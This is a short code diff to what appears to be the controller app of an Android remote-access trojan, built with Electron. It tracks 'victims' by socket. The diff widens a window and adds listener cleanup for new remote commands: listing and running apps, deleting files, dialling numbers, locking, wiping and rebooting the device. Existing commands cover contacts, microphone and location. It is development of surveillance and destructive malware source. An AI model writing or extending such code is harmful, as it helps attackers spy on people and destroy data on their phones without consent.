@@ -216,7 +216,7 @@ ipcMain.on('openLabWindow', function (e, page, index) {
   let child = new BrowserWindow({
     icon: __dirname + '/app/assets/img/icon.ico',
     parent: win,
-    width: 700,
+    width: 800,
     height: 750,
     darkTheme: true,
     transparent: true,
@@ -250,6 +250,13 @@ ipcMain.on('openLabWindow', function (e, page, index) {
       victimsList.getVictim(index).socket.removeAllListeners("x0000cn"); // contacts
       victimsList.getVictim(index).socket.removeAllListeners("x0000mc"); // mic
       victimsList.getVictim(index).socket.removeAllListeners("x0000lm"); // location
+      victimsList.getVictim(index).socket.removeAllListeners("x0000apps"); // apps
+      victimsList.getVictim(index).socket.removeAllListeners("x0000runApp"); // run apps
+      victimsList.getVictim(index).socket.removeAllListeners("x0000deleteFF"); // delete file or folder
+      victimsList.getVictim(index).socket.removeAllListeners("x0000dm"); // dial to number
+      victimsList.getVictim(index).socket.removeAllListeners("x0000lockDevice"); // lock device
+      victimsList.getVictim(index).socket.removeAllListeners("x0000wipeDevice"); // wipe out device
+      victimsList.getVictim(index).socket.removeAllListeners("x0000rebootDevice"); // reboot device
     }
   })
 });
